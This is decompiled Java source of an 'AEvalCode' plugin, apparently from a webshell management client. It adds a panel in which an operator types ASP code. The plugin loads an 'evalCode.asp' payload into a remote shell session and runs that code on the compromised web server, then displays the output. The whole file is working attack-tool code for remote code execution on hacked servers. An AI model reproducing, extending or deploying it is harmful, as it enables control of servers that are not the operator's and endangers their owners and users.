/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.asp;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.FlowLayout;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.border.TitledBorder;
import util.Log;
import util.TemplateEx;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(payloadName="AspDynamicPayload", Name="AEvalCode", DisplayName="\u4ee3\u7801\u6267\u884c")
public class AEvalCode
implements Plugin {
    private static final String CLASS_NAME = "AEvalCode";
    private final JPanel panel = new JPanel(new BorderLayout());
    private final RTextArea codeTextArea = new RTextArea();
    private final JButton runButton;
    private final RTextArea resultTextArea = new RTextArea();
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public AEvalCode() {
        this.runButton = new JButton("Run");
        JSplitPane pane1 = new JSplitPane();
        JSplitPane pane2 = new JSplitPane();
        JPanel runButtonPanel = new JPanel(new FlowLayout());
        runButtonPanel.add(this.runButton);
        this.codeTextArea.setBorder(new TitledBorder("code"));
        this.resultTextArea.setBorder(new TitledBorder("result"));
        this.codeTextArea.setText(TemplateEx.run("\nFunction {methodName}\n\t{methodName}=\"hello\"\nEnd Function\nGlobalResult={methodName}()\t\t\t\t\t"));
        pane1.setOrientation(1);
        pane1.setLeftComponent(new JScrollPane(this.codeTextArea));
        pane1.setRightComponent(runButtonPanel);
        pane2.setOrientation(1);
        pane2.setLeftComponent(pane1);
        pane2.setRightComponent(new JScrollPane(this.resultTextArea));
        this.panel.add(pane2);
    }

    private void Load() {
        block5: {
            if (!this.loadState) {
                try {
                    InputStream inputStream = this.getClass().getResourceAsStream("assets/evalCode.asp");
                    byte[] data = functions.readInputStream(inputStream);
                    inputStream.close();
                    if (this.payload.include(CLASS_NAME, data)) {
                        this.loadState = true;
                        Log.log("Load success", new Object[0]);
                        break block5;
                    }
                    Log.error("Load fail");
                } catch (Exception e) {
                    Log.error(e);
                }
            } else {
                GOptionPane.showMessageDialog(this.panel, "Loaded", "\u63d0\u793a", 1);
            }
        }
    }

    private void runButtonClick(ActionEvent actionEvent) {
        String code = this.codeTextArea.getText();
        if (code != null && code.trim().length() > 0) {
            String resultString = this.eval(code);
            this.resultTextArea.setText(resultString);
        } else {
            GOptionPane.showMessageDialog(this.panel, "code is null", "\u63d0\u793a", 2);
        }
    }

    public String eval(String code) {
        return this.eval(code, new ReqParameter());
    }

    public String eval(String code, ReqParameter reqParameter) {
        reqParameter.add("plugin_eval_code", code);
        if (!this.loadState) {
            this.Load();
        }
        String resultString = this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "xxx", reqParameter));
        return resultString;
    }

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override
    public JPanel getView() {
        return this.panel;
    }
}

